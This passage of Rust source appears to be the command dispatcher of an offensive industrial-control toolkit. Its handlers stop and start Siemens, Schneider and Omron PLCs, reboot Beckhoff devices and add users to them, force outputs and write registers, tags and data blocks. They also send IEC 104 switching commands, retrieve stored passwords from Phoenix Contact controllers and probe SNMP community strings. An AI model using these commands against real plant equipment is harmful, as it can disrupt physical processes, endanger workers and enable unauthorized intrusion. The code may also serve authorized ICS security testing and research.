            let (_, tags) = webvisit::get_tags(&target, port)?;
            crate::display::print_success(&format!("Found {} tag(s).", tags.len()));
            if read {
                let values = webvisit::read_tag_values(&target, port, &tags)?;
                for (name, val) in &values {
                    println!("  {name}: {val}");
                }
            }
            if let Some(pair) = write {
                let (tag_name, value) = pair.split_once('=').unwrap_or((&pair, "0"));
                webvisit::write_tag_value(&target, port, tag_name, value)?;
                crate::display::print_success(&format!("Wrote {tag_name} = {value}"));
            }
        }

        ExploitCmd::BeckhoffReboot { target, port } => {
            use crate::vendors::beckhoff::webcontrol;
            crate::display::print_info(&format!("Sending reboot to {target}…"));
            match webcontrol::reboot(&target, port) {
                Ok(true) => crate::display::print_success("Reboot command sent."),
                Ok(false) => crate::display::print_warn("Reboot sent (no confirmation)."),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }

        ExploitCmd::BeckhoffUser {
            target,
            port,
            username,
            password,
        } => {
            use crate::vendors::beckhoff::webcontrol;
            crate::display::print_info(&format!("Adding user '{username}' to {target}…"));
            match webcontrol::add_user(&target, port, &username, &password) {
                Ok(true) => crate::display::print_success("User creation command sent."),
                Ok(false) => crate::display::print_warn("Command sent (no confirmation)."),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }

        ExploitCmd::BeckhoffWriteSymbol {
            target,
            port,
            input,
        } => {
            use crate::vendors::beckhoff::{ads, scan};
            let local_netid = ads::build_local_netid(&local_ip_for(&target));
            let (sym_name, hex_val) = input.split_once('=').unwrap_or((&input, "00"));
            let value_bytes: Vec<u8> = hex_val
                .as_bytes()
                .chunks(2)
                .filter_map(|c| u8::from_str_radix(std::str::from_utf8(c).ok()?, 16).ok())
                .collect();
            if value_bytes.is_empty() {
                crate::display::print_error("Invalid hex value (format: SymbolName=hexbytes)");
                return Ok(());
            }
            let pb = crate::display::spinner_start(&format!("Discovering {target}…"));
            let devs = scan::discover_ip_with_port(&target, 3, true, port).unwrap_or_default();
            pb.finish_and_clear();
            let Some(dev) = devs.into_iter().next() else {
                crate::display::print_error("No Beckhoff device responded.");
                return Ok(());
            };
            match scan::write_symbol_value(&dev, &local_netid, sym_name, value_bytes, port) {
                Ok(true) => crate::display::print_success(&format!("Symbol '{sym_name}' written.")),
                Ok(false) => crate::display::print_warn("Write sent — ADS error code returned."),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }

        ExploitCmd::ModbusReadCoils {
            target,
            start,
            count,
            port,
        } => {
            use crate::vendors::schneider::modbus;
            crate::display::print_info(&format!(
                "Reading {count} coils from {target} (start={start})…"
            ));
            match modbus::read_coils(&target, port, start, count) {
                Ok(regs) => {
                    for r in &regs {
                        crate::display::print_success(&format!(
                            "  {:>6}  {}",
                            r.display_addr, r.value_str
                        ));
                    }
                    println!("[+] {} coil(s) read", regs.len());
                }
                Err(e) => crate::display::print_error(&format!("[-] {e}")),
            }
        }

        ExploitCmd::ModbusReadRegisters {
            target,
            start,
            count,
            port,
        } => {
            use crate::vendors::schneider::modbus;
            crate::display::print_info(&format!(
                "Reading {count} holding registers from {target} (start={start})…"
            ));
            match modbus::read_holding_registers(&target, port, start, count) {
                Ok(regs) => {
                    for r in &regs {
                        crate::display::print_success(&format!(
                            "  {:>6}  {}",
                            r.display_addr, r.value_str
                        ));
                    }
                    println!("[+] {} register(s) read", regs.len());
                }
                Err(e) => crate::display::print_error(&format!("[-] {e}")),
            }
        }

        ExploitCmd::ModbusReadInputRegisters {
            target,
            start,
            count,
            port,
        } => {
            use crate::vendors::schneider::modbus;
            crate::display::print_info(&format!(
                "Reading {count} input registers from {target} (start={start})…"
            ));
            match modbus::read_input_registers(&target, port, start, count) {
                Ok(regs) => {
                    for r in &regs {
                        crate::display::print_success(&format!(
                            "  {:>6}  {}",
                            r.display_addr, r.value_str
                        ));
                    }
                    println!("[+] {} register(s) read", regs.len());
                }
                Err(e) => crate::display::print_error(&format!("[-] {e}")),
            }
        }

        ExploitCmd::ModbusWriteCoil {
            target,
            address,
            state,
            port,
        } => {
            use crate::vendors::schneider::modbus;
            let on = !state.eq_ignore_ascii_case("off");
            crate::display::print_info(&format!(
                "Writing coil {address} = {} on {target}…",
                if on { "ON" } else { "OFF" }
            ));
            match modbus::write_single_coil(&target, port, address, on) {
                Ok(()) => crate::display::print_success("Coil written."),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }

        ExploitCmd::ModbusWriteRegister {
            target,
            address,
            value,
            port,
        } => {
            use crate::vendors::schneider::modbus;
            crate::display::print_info(&format!(
                "Writing register {address} = {value} on {target}…"
            ));
            match modbus::write_single_register(&target, port, address, value) {
                Ok(()) => crate::display::print_success("Register written."),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }

        ExploitCmd::ModbusWriteRegisters {
            target,
            start,
            values,
            port,
        } => {
            use crate::vendors::schneider::modbus;
            let parsed: Vec<u16> = values
                .split(',')
                .filter_map(|s| s.trim().parse::<u16>().ok())
                .collect();
            if parsed.is_empty() {
                crate::display::print_error("No valid register values.");
                return Ok(());
            }
            match modbus::write_multiple_registers(&target, port, start, &parsed) {
                Ok(n) => crate::display::print_success(&format!("{n} register(s) written.")),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }

        ExploitCmd::Fc90Stop { target, port } => {
            use crate::vendors::schneider::modicon_fc90;
            crate::display::print_info(&format!("FC90 STOP (M340/Quantum) to {target}…"));
            match modicon_fc90::stop_plc(&target, port) {
                Ok(true) => crate::display::print_success("PLC stopped."),
                Ok(false) => crate::display::print_warn("Command sent — no confirmation."),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }

        ExploitCmd::Fc90Start { target, port } => {
            use crate::vendors::schneider::modicon_fc90;
            crate::display::print_info(&format!("FC90 START (M340/Quantum) to {target}…"));
            match modicon_fc90::start_plc(&target, port) {
                Ok(true) => crate::display::print_success("PLC started."),
                Ok(false) => crate::display::print_warn("Command sent — no confirmation."),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }

        ExploitCmd::Fc90StopTm221 { target, port } => {
            use crate::vendors::schneider::modicon_fc90;
            crate::display::print_info(&format!("FC90 STOP TM221 to {target}…"));
            match modicon_fc90::stop_tm221(&target, port) {
                Ok(true) => crate::display::print_success("TM221 stopped."),
                Ok(false) => crate::display::print_warn("Command sent — no confirmation."),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }

        ExploitCmd::Fc90StartTm221 { target, port } => {
            use crate::vendors::schneider::modicon_fc90;
            crate::display::print_info(&format!("FC90 START TM221 to {target}…"));
            match modicon_fc90::start_tm221(&target, port) {
                Ok(true) => crate::display::print_success("TM221 started."),
                Ok(false) => crate::display::print_warn("Command sent — no confirmation."),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }

        ExploitCmd::Fc90Force {
            target,
            output,
            state,
            port,
        } => {
            use crate::vendors::schneider::modicon_fc90::{self, ForceState};
            let output_byte =
                u8::from_str_radix(output.trim().trim_start_matches("0x"), 16).unwrap_or(0x11);
            let force_state = match state.to_lowercase().as_str() {
                "off" => ForceState::Off,
                "unforce" => ForceState::Unforce,
                _ => ForceState::On,
            };
            crate::display::print_info(&format!(
                "FC90 Force output 0x{output_byte:02x} to {state} on {target}…"
            ));
            match modicon_fc90::force_output_bit(&target, port, output_byte, force_state) {
                Ok(true) => crate::display::print_success("Force command sent."),
                Ok(false) => crate::display::print_warn("Command sent — no confirmation."),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }

        ExploitCmd::SlmpReadD {
            target,
            start,
            count,
            port,
        } => {
            use crate::vendors::mitsubishi::slmp;
            crate::display::print_info(&format!(
                "Reading {count} D register(s) from {target} starting at D{start}..."
            ));
            match slmp::read_word_devices(&target, port, "D", start, count) {
                Ok(values) => {
                    for value in &values {
                        println!("  {:>8}  {}", value.display, value.value_str);
                    }
                    crate::display::print_success(&format!("{} D register(s) read.", values.len()));
                }
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }

        ExploitCmd::SlmpReadM {
            target,
            start,
            count,
            port,
        } => {
            use crate::vendors::mitsubishi::slmp;
            crate::display::print_info(&format!(
                "Reading {count} M bit(s) from {target} starting at M{start}..."
            ));
            match slmp::read_bit_devices(&target, port, "M", start, count) {
                Ok(values) => {
                    for value in &values {
                        println!("  {:>8}  {}", value.display, value.value_str);
                    }
                    crate::display::print_success(&format!("{} M bit(s) read.", values.len()));
                }
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }

        ExploitCmd::SlmpWriteD {
            target,
            start,
            values,
            port,
        } => {
            use crate::vendors::mitsubishi::slmp;
            let parsed: Vec<u16> = values
                .split(',')
                .filter_map(|s| s.trim().parse::<u16>().ok())
                .collect();
            if parsed.is_empty() {
                crate::display::print_error("No valid D register values.");
                return Ok(());
            }
            match slmp::write_word_devices(&target, port, "D", start, &parsed) {
                Ok(()) => crate::display::print_success(&format!(
                    "{} D register(s) written starting at D{start}.",
                    parsed.len()
                )),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }

        ExploitCmd::SlmpWriteM {
            target,
            start,
            bits,
            port,
        } => {
            use crate::vendors::mitsubishi::slmp;
            let parsed: Vec<bool> = bits
                .trim()
                .chars()
                .filter_map(|c| match c {
                    '0' => Some(false),
                    '1' => Some(true),
                    _ => None,
                })
                .collect();
            if parsed.is_empty() {
                crate::display::print_error("No valid bit values (use 0/1 characters).");
                return Ok(());
            }
            match slmp::write_bit_devices(&target, port, "M", start, &parsed) {
                Ok(()) => crate::display::print_success(&format!(
                    "{} M bit(s) written starting at M{start}.",
                    parsed.len()
                )),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }
    }
    Ok(())
}

// ===================================================================
// Rockwell handlers
// ===================================================================

fn run_rockwell(cmd: RockwellCmd) {
    match cmd {
        RockwellCmd::Info { target, port } => {
            use crate::vendors::rockwell::driver;
            let pb = crate::display::spinner_start(&format!("Connecting to {target}…"));
            let result = driver::get_device_info(&target, port);
            pb.finish_and_clear();
            match result {
                Ok(dev) => {
                    crate::display::print_success("Identity retrieved.");
                    println!("  Vendor:       {}", dev.vendor);
                    println!("  Product Type: {}", dev.product_type);
                    println!("  Product Code: {}", dev.product_code);
                    println!("  Product Name: {}", dev.product_name);
                    println!("  Revision:     {}", dev.revision);
                    println!("  Serial:       {}", dev.serial);
                }
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }

        RockwellCmd::Tags { target, port } => {
            use crate::vendors::rockwell::driver;
            let pb = crate::display::spinner_start(&format!("Enumerating tags on {target}…"));
            let result = driver::enumerate_tags(&target, port);
            pb.finish_and_clear();
            match result {
                Ok(tags) => {
                    for t in &tags {
                        println!(
                            "  [{:>5}] {} (type=0x{:04x}, dims={})",
                            t.instance_id, t.name, t.tag_type, t.dimensions
                        );
                    }
                    crate::display::print_success(&format!("{} tag(s) found.", tags.len()));
                }
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }

        RockwellCmd::Read { target, port, tag } => {
            use crate::vendors::rockwell::driver;
            if let Some(name) = tag {
                let pb = crate::display::spinner_start(&format!("Reading {name}…"));
                let result = driver::read_tag(&target, port, &name);
                pb.finish_and_clear();
                match result {
                    Ok(raw) => println!("  {name} = 0x{}", hex_encode(&raw)),
                    Err(e) => crate::display::print_error(&format!("{e}")),
                }
            } else {
                // Enumerate and print all
                let pb = crate::display::spinner_start(&format!("Enumerating tags on {target}…"));
                let result = driver::enumerate_tags(&target, port);
                pb.finish_and_clear();
                match result {
                    Ok(tags) => {
                        for t in &tags {
                            println!("  {}", t.name);
                        }
                        crate::display::print_success(&format!("{} tag(s) found.", tags.len()));
                    }
                    Err(e) => crate::display::print_error(&format!("{e}")),
                }
            }
        }

        RockwellCmd::Write {
            target,
            port,
            assignments,
        } => {
            use crate::vendors::rockwell::driver;
            for pair in &assignments {
                let Some((name, hex_val)) = pair.split_once('=') else {
                    crate::display::print_warn(&format!("Skipping invalid pair: {pair}"));
                    continue;
                };
                let value_bytes: Vec<u8> = hex_val
                    .as_bytes()
                    .chunks(2)
                    .filter_map(|c| {
                        let s = std::str::from_utf8(c).ok()?;
                        u8::from_str_radix(s, 16).ok()
                    })
                    .collect();

                // Type 0x00C1 = BOOL, 0x00C4 = DINT, 0x00CA = REAL — default DINT
                let type_code: u16 = match value_bytes.len() {
                    1 => 0x00C1,
                    _ => 0x00C4,
                };
                match driver::write_tag(&target, port, name, type_code, &value_bytes) {
                    Ok(()) => crate::display::print_success(&format!("{name}: written")),
                    Err(e) => crate::display::print_error(&format!("{name}: {e}")),
                }
            }
        }
    }
}

// ===================================================================
// Siemens handlers
// ===================================================================

fn run_siemens(cmd: SiemensCmd) {
    match cmd {
        SiemensCmd::Cpu {
            target,
            port,
            flip,
            password,
        } => {
            use crate::vendors::siemens::s7comm;
            let state = s7comm::get_cpu_state(&target, port, 5, password.as_deref());
            crate::display::print_info(&format!("CPU state: {state}"));
            if flip {
                if s7comm::change_cpu_state(&target, port, 5) {
                    let new_state = s7comm::get_cpu_state(&target, port, 5, password.as_deref());
                    crate::display::print_success(&format!("New state: {new_state}"));
                } else {
                    crate::display::print_error("Failed to toggle CPU state.");
                }
            }
        }
        SiemensCmd::Io {
            target,
            port,
            password,
        } => {
            use crate::vendors::siemens::s7comm;
            let pb = crate::display::spinner_start(&format!("Reading I/O from {target}…"));
            let data = s7comm::read_all_data(&target, port, 5, password.as_deref());
            pb.finish_and_clear();
            let mut any = false;
            for area in &["inputs", "outputs", "merkers"] {
                if let Some(Some(bits)) = data.get(*area) {
                    any = true;
                    println!("  {area}:");
                    let mut keys: Vec<&String> = bits.keys().collect();
                    keys.sort();
                    for bit in keys {
                        println!("    {bit}: {}", bits[bit]);
                    }
                }
            }
            if !any {
                crate::display::print_warn("No I/O data received.");
            }
        }

        SiemensCmd::WriteDb {
            target,
            port,
            db,
            offset,
            data,
            password,
        } => {
            use crate::vendors::siemens::s7comm;
            let bytes: Vec<u8> = data
                .as_bytes()
                .chunks(2)
                .filter_map(|c| u8::from_str_radix(std::str::from_utf8(c).ok()?, 16).ok())
                .collect();
            if bytes.is_empty() {
                crate::display::print_error("Invalid hex data.");
                return;
            }
            crate::display::print_info(&format!(
                "Writing {} byte(s) to DB{db}:{offset} on {target}…",
                bytes.len()
            ));
            match s7comm::write_data_block(
                &target,
                db,
                offset,
                &bytes,
                port,
                5,
                password.as_deref(),
            ) {
                Ok(true) => crate::display::print_success("DB write acknowledged."),
                Ok(false) => crate::display::print_warn("Write sent — PLC did not acknowledge."),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }
    }
}

// ===================================================================
// Omron handlers
// ===================================================================

fn run_omron(cmd: OmronCmd) {
    match cmd {
        OmronCmd::Info { target, port } => {
            use crate::vendors::omron::fins;
            let pb = crate::display::spinner_start(&format!("Querying Omron FINS at {target}…"));
            let result = fins::get_device_info_tcp(&target, port);
            pb.finish_and_clear();
            match result {
                Ok(dev) => {
                    println!("  Model:   {}", dev.model);
                    println!("  Version: {}", dev.version);
                    println!("  Node:    0x{:02x}", dev.node_addr);
                    crate::display::print_success("FINS device info retrieved.");
                }
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }

        OmronCmd::ReadDm {
            target,
            port,
            start,
            count,
        } => {
            use crate::vendors::omron::fins;
            let pb = crate::display::spinner_start(&format!(
                "Reading DM{start}..DM{} from {target}…",
                start + count - 1
            ));
            let result = fins::read_dm_words(&target, port, 0, start, count);
            pb.finish_and_clear();
            match result {
                Ok(vals) => {
                    println!("  {:<8}  {:<8}  Hex", "Address", "Dec");
                    for (i, &v) in vals.iter().enumerate() {
                        println!("  DM{:<6}  {:<8}  {v:#06x}", start + u16::try_from(i).unwrap_or(u16::MAX), v);
                    }
                    crate::display::print_success(&format!("{} word(s).", vals.len()));
                }
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }

        OmronCmd::WriteDm {
            target,
            port,
            start,
            values,
        } => {
            use crate::vendors::omron::fins;
            let parsed: Vec<u16> = values
                .split(',')
                .filter_map(|s| s.trim().parse::<u16>().ok())
                .collect();
            if parsed.is_empty() {
                crate::display::print_error("No valid values.");
                return;
            }
            match fins::write_dm_words(&target, port, 0, start, &parsed) {
                Ok(()) => crate::display::print_success(&format!(
                    "{} DM word(s) written at DM{start}.",
                    parsed.len()
                )),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }

        OmronCmd::CpuStatus { target, port } => {
            use crate::vendors::omron::fins;
            match fins::get_cpu_state(&target, port, 0) {
                Ok(state) => crate::display::print_success(&format!("CPU state: {state}")),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }

        OmronCmd::CpuRun { target, port } => {
            use crate::vendors::omron::fins;
            crate::display::print_info(&format!("Setting Omron CPU to Monitor/Run on {target}…"));
            match fins::set_cpu_mode(&target, port, 0, true) {
                Ok(true) => crate::display::print_success("CPU set to Monitor/Run mode."),
                Ok(false) => crate::display::print_warn("FINS error — mode change rejected."),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }

        OmronCmd::CpuStop { target, port } => {
            use crate::vendors::omron::fins;
            crate::display::print_info(&format!("Setting Omron CPU to STOP on {target}…"));
            match fins::set_cpu_mode(&target, port, 0, false) {
                Ok(true) => crate::display::print_success("CPU stopped."),
                Ok(false) => crate::display::print_warn("FINS error — mode change rejected."),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }
    }
}

// ===================================================================
// IEC 104 handlers
// ===================================================================

fn run_iec104(cmd: Iec104Cmd) -> Result<()> {
    match cmd {
        Iec104Cmd::Gi { target, port } => {
            use crate::vendors::iec104::client;
            let pb = crate::display::spinner_start(&format!("Connecting to IEC 104 at {target}…"));
            let result = client::connect(&target, port);
            pb.finish_and_clear();
            match result {
                Ok(mut sess) => {
                    crate::display::print_success("STARTDT confirmed.");
                    match client::general_interrogation(&mut sess) {
                        Ok(objs) => {
                            for obj in &objs {
                                println!(
                                    "  IOA {:>6}: type=0x{:02x} data={:?}",
                                    obj.ioa, obj.type_id, obj.value
                                );
                            }
                            crate::display::print_success(&format!("{} object(s).", objs.len()));
                        }
                        Err(e) => crate::display::print_error(&format!("GI failed: {e}")),
                    }
                }
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }

        Iec104Cmd::ScOn { target, port, ioa } => {
            use crate::vendors::iec104::client;
            let mut sess = client::connect(&target, port)?;
            match client::single_command(&mut sess, ioa, true) {
                Ok(true) => crate::display::print_success(&format!(
                    "IOA {ioa}: Single Command ON confirmed."
                )),
                Ok(false) => crate::display::print_warn("Command sent — negative confirmation."),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }

        Iec104Cmd::ScOff { target, port, ioa } => {
            use crate::vendors::iec104::client;
            let mut sess = client::connect(&target, port)?;
            match client::single_command(&mut sess, ioa, false) {
                Ok(true) => crate::display::print_success(&format!(
                    "IOA {ioa}: Single Command OFF confirmed."
                )),
                Ok(false) => crate::display::print_warn("Command sent — negative confirmation."),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }

        Iec104Cmd::Dc {
            target,
            port,
            ioa,
            state,
        } => {
            use crate::vendors::iec104::client;
            let state_name = match state {
                1 => "OFF",
                2 => "ON",
                _ => "INDETERMINATE",
            };
            crate::display::print_info(&format!(
                "IEC 104 Double Command IOA {ioa} → {state_name} on {target}…"
            ));
            let mut sess = client::connect(&target, port)?;
            match client::double_command(&mut sess, ioa, state) {
                Ok(true) => crate::display::print_success("Double Command confirmed."),
                Ok(false) => crate::display::print_warn("Command sent — negative confirmation."),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }
    }
    Ok(())
}

// ===================================================================
// Phoenix handlers
// ===================================================================

fn run_phoenix(cmd: PhoenixCmd) -> Result<()> {
    match cmd {
        PhoenixCmd::Info { target, port } => {
            use crate::vendors::phoenix::control;
            let pb = crate::display::spinner_start(&format!("Querying {target}…"));
            let result = control::get_device_info(&target, port, false);
            pb.finish_and_clear();
            match result {
                Ok(info) => {
                    println!("  PLC Type: {}", info.plc_type);
                    if let Some(fw) = info.firmware {
                        println!("  Firmware: {fw}");
                    }
                    if let Some(b) = info.build {
                        println!("  Build:    {b}");
                    }
                }
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }

        PhoenixCmd::Tags { target, port } => {
            use crate::vendors::phoenix::webvisit;
            let (project, tags) = webvisit::get_tags(&target, port)?;
            println!("  Project: {project}");
            for (i, tag) in tags.iter().enumerate() {
                println!("  [{i:>4}] {tag}");
            }
            crate::display::print_success(&format!("{} tag(s).", tags.len()));
        }

        PhoenixCmd::ReadTags { target, port } => {
            use crate::vendors::phoenix::webvisit;
            let (_, tags) = webvisit::get_tags(&target, port)?;
            let values = webvisit::read_tag_values(&target, port, &tags)?;
            for (name, val) in &values {
                println!("  {name}: {val}");
            }
        }

        PhoenixCmd::WriteTag {
            target,
            port,
            name,
            value,
        } => {
            use crate::vendors::phoenix::webvisit;
            webvisit::write_tag_value(&target, port, &name, &value)?;
            crate::display::print_success(&format!("Wrote {name} = {value}"));
        }

        PhoenixCmd::Passwords { target, port } => {
            use crate::vendors::phoenix::webvisit;
            let pb = crate::display::spinner_start(&format!("Retrieving passwords from {target}…"));
            let result = webvisit::retrieve_passwords(&target, port);
            pb.finish_and_clear();
            match result {
                Ok(entries) if entries.is_empty() => {
                    crate::display::print_warn("No passwords retrieved.");
                }
                Ok(entries) => {
                    for e in &entries {
                        if let Some(p) = &e.password {
                            println!("  User Level {}: {p}", e.user_level);
                        } else if let Some(h) = &e.hash {
                            println!("  User Level {} [sha256]: {h}", e.user_level);
                        }
                    }
                }
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }
    }
    Ok(())
}

// ===================================================================
// DB handlers
// ===================================================================

fn run_db(cmd: DbCmd) -> Result<()> {
    use crate::db::Database;
    let db = Database::open(&Database::default_path())?;
    match cmd {
        DbCmd::Add { ip, vendor } => {
            let vendor = vendor.as_deref().unwrap_or("unknown");
            let id =
                db.upsert_device(&ip, vendor, &serde_json::Value::Object(serde_json::Map::default()))?;
            crate::display::print_success(&format!("Added {ip} (vendor={vendor}, id={id})"));
        }
        DbCmd::Remove { id } => {
            db.delete_device(id)?;
            crate::display::print_success(&format!("Removed device id={id}"));
        }
    }
    Ok(())
}

// ===================================================================
// SNMP command definitions and handler
// ===================================================================

#[derive(Subcommand)]
pub enum SnmpCmd {
    /// GET a single OID and print its value
    Get {
        #[arg(short, long)]
        target: String,
        #[arg(short, long)]
        oid: String,
        #[arg(short, long, default_value = "public")]
        community: String,
        #[arg(short, long, default_value = "161")]
        port: u16,
    },
    /// Walk an OID subtree (GETNEXT loop) and print all results
    Walk {
        #[arg(short, long)]
        target: String,
        #[arg(short, long)]
        oid: String,
        #[arg(short, long, default_value = "public")]
        community: String,
        #[arg(short, long, default_value = "161")]
        port: u16,
    },
    /// Enumerate system info, interfaces, and network topology
    Enum {
        #[arg(short, long)]
        target: String,
        #[arg(short, long, default_value = "public")]
        community: String,
        #[arg(short, long, default_value = "161")]
        port: u16,
    },
    /// Probe common community strings and show what responds
    Scan {
        #[arg(short, long)]
        target: String,
        #[arg(short, long, default_value = "161")]
        port: u16,
    },
    /// SET an OID value (requires write community, --confirm mandatory)
    Set {
        #[arg(short, long)]
        target: String,
        #[arg(short, long)]
        oid: String,
        #[arg(short, long)]
        value: String,
        /// Value type: int | str
        #[arg(long, default_value = "str")]
        r#type: String,
        #[arg(long)]
        community: String,
        #[arg(short, long, default_value = "161")]
        port: u16,
        /// Confirm you intend to write to this device
        #[arg(long)]
        confirm: bool,
    },
}

fn run_snmp(cmd: SnmpCmd) -> Result<()> {
    use crate::vendors::snmp::{client, enumerate, oids};
    match cmd {
        SnmpCmd::Get { target, oid, community, port } => {
            let val = client::get(&target, port, &community, &oid)?;
            println!("  {oid} = {}", val.display());
        }

        SnmpCmd::Walk { target, oid, community, port } => {
            let pb = crate::display::spinner_start(&format!("Walking {oid} on {target}…"));
            let entries = client::walk(&target, port, &community, &oid)?;
            pb.finish_and_clear();
            if entries.is_empty() {
                crate::display::print_warn("No results (end of MIB or wrong community).");
            } else {
                for (o, v) in &entries {
                    println!("  {o} = {}", v.display());
                }
                crate::display::print_success(&format!("{} object(s).", entries.len()));
            }
        }

        SnmpCmd::Enum { target, community, port } => {
            let pb = crate::display::spinner_start(&format!("Enumerating {target}…"));
            let info = enumerate::get_system_info(&target, port, &community)?;
            let ifaces = enumerate::get_interfaces(&target, port, &community).unwrap_or_default();
            let topo = enumerate::get_topology(&target, port, &community).unwrap_or_default();
            pb.finish_and_clear();

            println!("  sysDescr:   {}", info.descr);
            println!("  sysOID:     {}", info.object_id);
            println!("  sysName:    {}", info.name);
            println!("  sysContact: {}", info.contact);
            println!("  sysLocatn:  {}", info.location);
            println!("  Uptime:     {}s", info.uptime_secs);
            if let Some(v) = info.ics_vendor { println!("  ICS Vendor: {v}"); }
            if info.is_apc_ups { println!("  APC UPS:    yes"); }

            if !ifaces.is_empty() {
                println!("\n  Interfaces:");
                for i in &ifaces {
                    let state = if i.oper_up { "up" } else { "DOWN" };
                    println!("    [{:>2}] {:<16} {} {:<5}  {}Mbps  err in:{} out:{}",
                        i.index, i.descr, i.mac, state, i.speed_mbps, i.in_errors, i.out_errors);
                }
            }
            for line in &topo { println!("{line}"); }

            let cves = enumerate::check_cves(&info);
            if !cves.is_empty() {
                println!("\n  CVE / advisory matches:");
                for c in &cves {
                    println!("    [{}] CVSS:{} {}", c.id, c.cvss, c.summary);
                }
            }
            crate::display::print_success("Enumeration complete.");
        }

        SnmpCmd::Scan { target, port } => {
            let pb = crate::display::spinner_start(&format!("Scanning communities on {target}…"));
            let mut found = Vec::new();
            for &c in oids::COMMON_COMMUNITIES {
                if let Ok(val) = client::get(&target, port, c, oids::SYS_DESCR) {
                    found.push((c, val.display()));
                }
            }
            pb.finish_and_clear();
            if found.is_empty() {
                crate::display::print_warn("No community strings responded.");
            } else {
                for (c, descr) in &found {
                    println!("  community={c:<12}  sysDescr={descr}");
                }
                crate::display::print_success(&format!("{} community string(s) found.", found.len()));
            }
        }

        SnmpCmd::Set { target, oid, value, r#type, community, port, confirm } => {
            if !confirm {
                anyhow::bail!("Add --confirm to confirm you intend to write to {target}");
            }
            let snmp_val = match r#type.as_str() {
                "int" => client::SnmpValue::Integer(value.parse::<i64>()?),
                _ => client::SnmpValue::OctetString(value.into_bytes()),
            };
            let result = client::set(&target, port, &community, &oid, &snmp_val)?;
            println!("  {oid} → {}", result.display());
            crate::display::print_success("SET accepted.");
        }
    }
    Ok(())
}

// ===================================================================
// Helpers
// ===================================================================

fn local_ip_for(target: &str) -> String {
    use std::net::UdpSocket;
    let Ok(sock) = UdpSocket::bind("0.0.0.0:0") else { return "0.0.0.0".into() };
    let _ = sock.connect(format!("{target}:1"));
    sock.local_addr().map_or_else(|_| "0.0.0.0".into(), |a| a.ip().to_string())
}

fn summarize_device(info: &crate::core::autodetect::DeviceInfo) -> String {
    const FIELDS: &[(&str, &str)] = &[
        ("hardware", "Hardware"),
        ("firmware", "FW"),
        ("cpu_state", "CPU"),
        ("product_name", "Product"),
        ("revision", "Rev"),
        ("plc_type", "Type"),
        ("model", "Model"),
        ("version", "Version"),
        ("name", "Name"),
        ("tc_version", "TwinCAT"),
        ("netid", "NetID"),
        ("serial", "Serial"),
        ("snmp_community", "community"),
        ("sys_descr", "sysDescr"),
        ("sys_name", "sysName"),
    ];
    let mut parts = Vec::new();
    for (key, label) in FIELDS {
        let Some(value) = info.fields.get(*key) else { continue };
        let text = match value {
            serde_json::Value::String(s) => s.clone(),
            other => other.to_string(),
        };
        if !text.is_empty() {
            parts.push(format!("{label}={text}"));
        }
    }
    if parts.is_empty() {
        info.vendor.to_uppercase()
    } else {
        format!("{}  {}", info.vendor.to_uppercase(), parts.join("  "))
    }
}

fn hex_encode(b: &[u8]) -> String {
    use std::fmt::Write;
    b.iter().fold(String::new(), |mut s, x| {
        let _ = write!(s, "{x:02x}");
        s
    })
}
